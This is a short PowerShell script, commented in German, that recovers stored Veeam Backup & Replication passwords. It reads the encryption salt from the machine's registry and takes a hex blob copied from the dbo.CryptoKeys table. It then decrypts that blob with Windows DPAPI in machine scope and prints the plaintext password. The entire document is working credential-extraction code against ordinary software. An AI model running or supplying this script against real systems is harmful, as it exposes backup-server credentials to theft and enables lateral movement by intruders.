Add-Type -AssemblyName System.Security

# 1. Salt direkt ohne Schleife aus der Registry parsen
$salt = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\Data").EncryptionSalt
$entropy = [System.Convert]::FromBase64String($salt)

Write-Host "=================================================="
Write-Host "[!] Kopiere den Hex-Wert (key_value) des zu entschlüsselnden Passworts aus dbo.CryptoKeys hier hinein:" -ForegroundColor White
$input = Read-Host "Hex-Inhalt"
Write-Host "=================================================="

# 2. Bereinigung und Isolierung des DPAPI-Startblocks
$hex = $input.Replace(" ", "").ToUpper()
$idx = $hex.IndexOf("01000000")

if ($idx -lt 0) {
    Write-Error "[-] Kein gueltiger Windows DPAPI-Blob gefunden."
    return
}

# 3. .NET-interne, extrem robuste Hex-zu-Byte Konvertierung (Keine Schleife nötig!)
$cleanHex = $hex.Substring($idx)
$bytes = [System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary]::Parse($cleanHex).Value

try {
    # 4. DPAPI-Entschlüsselung
    $scope = [System.Security.Cryptography.DataProtectionScope]::LocalMachine
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $entropy, $scope)
    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
    
    Write-Host "[+] Entschluesselung erfolgreich!" -ForegroundColor Green
    Write-Host "Klartext-Passwort: $password" -ForegroundColor Yellow
} catch {
    Write-Error "[-] DPAPI-Fehler bei der Entschluesselung: $_"
}
